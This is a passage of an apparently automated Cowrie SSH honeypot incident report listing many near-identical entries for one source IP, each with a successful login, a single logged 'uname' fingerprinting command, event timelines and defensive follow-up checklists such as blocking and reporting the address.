- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d4b186827a8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:15` | `cowrie.session.connect` |
| `2026-09-27 13:13:15` | `cowrie.client.version` |
| `2026-09-27 13:13:15` | `cowrie.client.kex` |
| `2026-09-27 13:13:16` | `cowrie.login.success` |
| `2026-09-27 13:13:17` | `cowrie.session.params` |
| `2026-09-27 13:13:17` | `cowrie.command.input` |
| `2026-09-27 13:13:17` | `cowrie.log.closed` |
| `2026-09-27 13:13:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ca05e5365fa

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:21` | `cowrie.session.connect` |
| `2026-09-27 13:13:21` | `cowrie.client.version` |
| `2026-09-27 13:13:21` | `cowrie.client.kex` |
| `2026-09-27 13:13:21` | `cowrie.login.success` |
| `2026-09-27 13:13:22` | `cowrie.session.params` |
| `2026-09-27 13:13:22` | `cowrie.command.input` |
| `2026-09-27 13:13:22` | `cowrie.log.closed` |
| `2026-09-27 13:13:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1160e5a5651

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:25` | `cowrie.session.connect` |
| `2026-09-27 13:13:25` | `cowrie.client.version` |
| `2026-09-27 13:13:26` | `cowrie.client.kex` |
| `2026-09-27 13:13:27` | `cowrie.login.success` |
| `2026-09-27 13:13:28` | `cowrie.session.params` |
| `2026-09-27 13:13:28` | `cowrie.command.input` |
| `2026-09-27 13:13:28` | `cowrie.log.closed` |
| `2026-09-27 13:13:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97556bc7c832

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:31` | `cowrie.session.connect` |
| `2026-09-27 13:13:31` | `cowrie.client.version` |
| `2026-09-27 13:13:31` | `cowrie.client.kex` |
| `2026-09-27 13:13:31` | `cowrie.login.success` |
| `2026-09-27 13:13:32` | `cowrie.session.params` |
| `2026-09-27 13:13:32` | `cowrie.command.input` |
| `2026-09-27 13:13:32` | `cowrie.log.closed` |
| `2026-09-27 13:13:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd46b27c4d62

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:35` | `cowrie.session.connect` |
| `2026-09-27 13:13:35` | `cowrie.client.version` |
| `2026-09-27 13:13:35` | `cowrie.client.kex` |
| `2026-09-27 13:13:36` | `cowrie.login.success` |
| `2026-09-27 13:13:37` | `cowrie.session.params` |
| `2026-09-27 13:13:37` | `cowrie.command.input` |
| `2026-09-27 13:13:37` | `cowrie.log.closed` |
| `2026-09-27 13:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d96a8203dc

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:41` | `cowrie.session.connect` |
| `2026-09-27 13:13:41` | `cowrie.client.version` |
| `2026-09-27 13:13:41` | `cowrie.client.kex` |
| `2026-09-27 13:13:41` | `cowrie.login.success` |
| `2026-09-27 13:13:42` | `cowrie.session.params` |
| `2026-09-27 13:13:42` | `cowrie.command.input` |
| `2026-09-27 13:13:42` | `cowrie.log.closed` |
| `2026-09-27 13:13:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97293abdd54d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:46` | `cowrie.session.connect` |
| `2026-09-27 13:13:46` | `cowrie.client.version` |
| `2026-09-27 13:13:46` | `cowrie.client.kex` |
| `2026-09-27 13:13:46` | `cowrie.login.success` |
| `2026-09-27 13:13:47` | `cowrie.session.params` |
| `2026-09-27 13:13:47` | `cowrie.command.input` |
| `2026-09-27 13:13:47` | `cowrie.log.closed` |
| `2026-09-27 13:13:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edf76da88171

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:51` | `cowrie.session.connect` |
| `2026-09-27 13:13:51` | `cowrie.client.version` |
| `2026-09-27 13:13:51` | `cowrie.client.kex` |
| `2026-09-27 13:13:52` | `cowrie.login.success` |
| `2026-09-27 13:13:53` | `cowrie.session.params` |
| `2026-09-27 13:13:53` | `cowrie.command.input` |
| `2026-09-27 13:13:53` | `cowrie.log.closed` |
| `2026-09-27 13:13:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c294f8245c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:13 |
| **Last Seen** | 2026-09-27 13:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:13:56` | `cowrie.session.connect` |
| `2026-09-27 13:13:56` | `cowrie.client.version` |
| `2026-09-27 13:13:56` | `cowrie.client.kex` |
| `2026-09-27 13:13:56` | `cowrie.login.success` |
| `2026-09-27 13:13:57` | `cowrie.session.params` |
| `2026-09-27 13:13:57` | `cowrie.command.input` |
| `2026-09-27 13:13:58` | `cowrie.log.closed` |
| `2026-09-27 13:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b196e376a873

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:02` | `cowrie.session.connect` |
| `2026-09-27 13:14:02` | `cowrie.client.version` |
| `2026-09-27 13:14:02` | `cowrie.client.kex` |
| `2026-09-27 13:14:02` | `cowrie.login.success` |
| `2026-09-27 13:14:03` | `cowrie.session.params` |
| `2026-09-27 13:14:03` | `cowrie.command.input` |
| `2026-09-27 13:14:03` | `cowrie.log.closed` |
| `2026-09-27 13:14:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a9a7da7be76

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:06` | `cowrie.session.connect` |
| `2026-09-27 13:14:06` | `cowrie.client.version` |
| `2026-09-27 13:14:06` | `cowrie.client.kex` |
| `2026-09-27 13:14:07` | `cowrie.login.success` |
| `2026-09-27 13:14:08` | `cowrie.session.params` |
| `2026-09-27 13:14:08` | `cowrie.command.input` |
| `2026-09-27 13:14:08` | `cowrie.log.closed` |
| `2026-09-27 13:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-250adc336ff8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:11` | `cowrie.session.connect` |
| `2026-09-27 13:14:11` | `cowrie.client.version` |
| `2026-09-27 13:14:11` | `cowrie.client.kex` |
| `2026-09-27 13:14:12` | `cowrie.login.success` |
| `2026-09-27 13:14:13` | `cowrie.session.params` |
| `2026-09-27 13:14:13` | `cowrie.command.input` |
| `2026-09-27 13:14:13` | `cowrie.log.closed` |
| `2026-09-27 13:14:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f04b7647104

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:16` | `cowrie.session.connect` |
| `2026-09-27 13:14:16` | `cowrie.client.version` |
| `2026-09-27 13:14:16` | `cowrie.client.kex` |
| `2026-09-27 13:14:16` | `cowrie.login.success` |
| `2026-09-27 13:14:17` | `cowrie.session.params` |
| `2026-09-27 13:14:17` | `cowrie.command.input` |
| `2026-09-27 13:14:17` | `cowrie.log.closed` |
| `2026-09-27 13:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b59e7d2f1fd

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:21` | `cowrie.session.connect` |
| `2026-09-27 13:14:21` | `cowrie.client.version` |
| `2026-09-27 13:14:21` | `cowrie.client.kex` |
| `2026-09-27 13:14:22` | `cowrie.login.success` |
| `2026-09-27 13:14:23` | `cowrie.session.params` |
| `2026-09-27 13:14:23` | `cowrie.command.input` |
| `2026-09-27 13:14:23` | `cowrie.log.closed` |
| `2026-09-27 13:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f26407f8200

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:26` | `cowrie.session.connect` |
| `2026-09-27 13:14:26` | `cowrie.client.version` |
| `2026-09-27 13:14:26` | `cowrie.client.kex` |
| `2026-09-27 13:14:27` | `cowrie.login.success` |
| `2026-09-27 13:14:28` | `cowrie.session.params` |
| `2026-09-27 13:14:28` | `cowrie.command.input` |
| `2026-09-27 13:14:28` | `cowrie.log.closed` |
| `2026-09-27 13:14:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81a19bdd06cf

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:31` | `cowrie.session.connect` |
| `2026-09-27 13:14:31` | `cowrie.client.version` |
| `2026-09-27 13:14:31` | `cowrie.client.kex` |
| `2026-09-27 13:14:32` | `cowrie.login.success` |
| `2026-09-27 13:14:33` | `cowrie.session.params` |
| `2026-09-27 13:14:33` | `cowrie.command.input` |
| `2026-09-27 13:14:33` | `cowrie.log.closed` |
| `2026-09-27 13:14:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ad85fed7e6

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:36` | `cowrie.session.connect` |
| `2026-09-27 13:14:36` | `cowrie.client.version` |
| `2026-09-27 13:14:37` | `cowrie.client.kex` |
| `2026-09-27 13:14:37` | `cowrie.login.success` |
| `2026-09-27 13:14:38` | `cowrie.session.params` |
| `2026-09-27 13:14:38` | `cowrie.command.input` |
| `2026-09-27 13:14:38` | `cowrie.log.closed` |
| `2026-09-27 13:14:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9bb02265d0c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:41` | `cowrie.session.connect` |
| `2026-09-27 13:14:42` | `cowrie.client.version` |
| `2026-09-27 13:14:42` | `cowrie.client.kex` |
| `2026-09-27 13:14:42` | `cowrie.login.success` |
| `2026-09-27 13:14:43` | `cowrie.session.params` |
| `2026-09-27 13:14:43` | `cowrie.command.input` |
| `2026-09-27 13:14:43` | `cowrie.log.closed` |
| `2026-09-27 13:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f36d7986d97

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:47` | `cowrie.session.connect` |
| `2026-09-27 13:14:47` | `cowrie.client.version` |
| `2026-09-27 13:14:47` | `cowrie.client.kex` |
| `2026-09-27 13:14:47` | `cowrie.login.success` |
| `2026-09-27 13:14:48` | `cowrie.session.params` |
| `2026-09-27 13:14:48` | `cowrie.command.input` |
| `2026-09-27 13:14:48` | `cowrie.log.closed` |
| `2026-09-27 13:14:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c456a8f54264

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:52` | `cowrie.session.connect` |
| `2026-09-27 13:14:52` | `cowrie.client.version` |
| `2026-09-27 13:14:52` | `cowrie.client.kex` |
| `2026-09-27 13:14:53` | `cowrie.login.success` |
| `2026-09-27 13:14:54` | `cowrie.session.params` |
| `2026-09-27 13:14:54` | `cowrie.command.input` |
| `2026-09-27 13:14:54` | `cowrie.log.closed` |
| `2026-09-27 13:14:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc76547802c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:14 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:14:57` | `cowrie.session.connect` |
| `2026-09-27 13:14:57` | `cowrie.client.version` |
| `2026-09-27 13:14:57` | `cowrie.client.kex` |
| `2026-09-27 13:14:59` | `cowrie.login.success` |
| `2026-09-27 13:14:59` | `cowrie.session.params` |
| `2026-09-27 13:14:59` | `cowrie.command.input` |
| `2026-09-27 13:15:00` | `cowrie.log.closed` |
| `2026-09-27 13:15:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-526184f35345

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:02` | `cowrie.session.connect` |
| `2026-09-27 13:15:02` | `cowrie.client.version` |
| `2026-09-27 13:15:02` | `cowrie.client.kex` |
| `2026-09-27 13:15:03` | `cowrie.login.success` |
| `2026-09-27 13:15:03` | `cowrie.session.params` |
| `2026-09-27 13:15:03` | `cowrie.command.input` |
| `2026-09-27 13:15:04` | `cowrie.log.closed` |
| `2026-09-27 13:15:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78b05e636b9c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:07` | `cowrie.session.connect` |
| `2026-09-27 13:15:07` | `cowrie.client.version` |
| `2026-09-27 13:15:07` | `cowrie.client.kex` |
| `2026-09-27 13:15:07` | `cowrie.login.success` |
| `2026-09-27 13:15:09` | `cowrie.session.params` |
| `2026-09-27 13:15:09` | `cowrie.command.input` |
| `2026-09-27 13:15:09` | `cowrie.log.closed` |
| `2026-09-27 13:15:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f3039445bf3

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:12` | `cowrie.session.connect` |
| `2026-09-27 13:15:12` | `cowrie.client.version` |
| `2026-09-27 13:15:12` | `cowrie.client.kex` |
| `2026-09-27 13:15:12` | `cowrie.login.success` |
| `2026-09-27 13:15:13` | `cowrie.session.params` |
| `2026-09-27 13:15:13` | `cowrie.command.input` |
| `2026-09-27 13:15:13` | `cowrie.log.closed` |
| `2026-09-27 13:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56415200c596

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:16` | `cowrie.session.connect` |
| `2026-09-27 13:15:16` | `cowrie.client.version` |
| `2026-09-27 13:15:16` | `cowrie.client.kex` |
| `2026-09-27 13:15:17` | `cowrie.login.success` |
| `2026-09-27 13:15:18` | `cowrie.session.params` |
| `2026-09-27 13:15:18` | `cowrie.command.input` |
| `2026-09-27 13:15:18` | `cowrie.log.closed` |
| `2026-09-27 13:15:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dd8c64bc6ee

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:21` | `cowrie.session.connect` |
| `2026-09-27 13:15:21` | `cowrie.client.version` |
| `2026-09-27 13:15:21` | `cowrie.client.kex` |
